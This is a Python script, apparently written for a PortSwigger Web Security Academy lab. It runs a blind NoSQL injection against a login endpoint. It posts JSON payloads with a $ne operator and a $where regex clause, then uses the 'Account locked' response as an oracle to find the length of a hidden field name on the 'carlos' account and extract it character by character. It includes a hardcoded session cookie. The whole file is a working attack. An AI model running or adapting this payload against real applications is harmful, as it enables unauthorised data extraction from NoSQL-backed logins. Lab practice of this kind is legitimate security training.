#!/usr/bin/env python3
import requests
import string

url = "https://0ac0009404a041e98218797d00cb006e.web-security-academy.net/login"
headers = {
    "Cookie": "session=CInUWYnpHEMIbjBVttgAfw3X7oTxjSRc",
    "Content-Type": "application/json"
}

# First, let's find the length of the field name
field_name = ""
found_length = 0

print("Finding field name length...")
for length in range(1, 30):
    payload = {
        "username": "carlos",
        "password": {"$ne": "invalid"},
        "$where": f"Object.keys(this)[4].match('^.{{{length}}}$')"
    }

    response = requests.post(url, headers=headers, json=payload)
    if "Account locked" in response.text:
        found_length = length
        print(f"Field name length: {length}")
        break

if found_length == 0:
    print("Could not determine field length")
    exit()

# Now extract each character
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_"
print(f"\nExtracting {found_length} character field name...")

for position in range(found_length):
    found = False
    for char in charset:
        # Escape special regex characters
        if char in ".*+?[]{}()^$|\\":
            char = "\\" + char

        payload = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": f"Object.keys(this)[4].match('^.{{{position}}}{char}.*')"
        }

        response = requests.post(url, headers=headers, json=payload)
        if "Account locked" in response.text:
            clean_char = char.replace("\\", "")
            field_name += clean_char
            print(f"Position {position}: {clean_char} (Field so far: {field_name})")
            found = True
            break

    if not found:
        print(f"Could not find character at position {position}")
        break

print(f"\nField name at index [4]: {field_name}")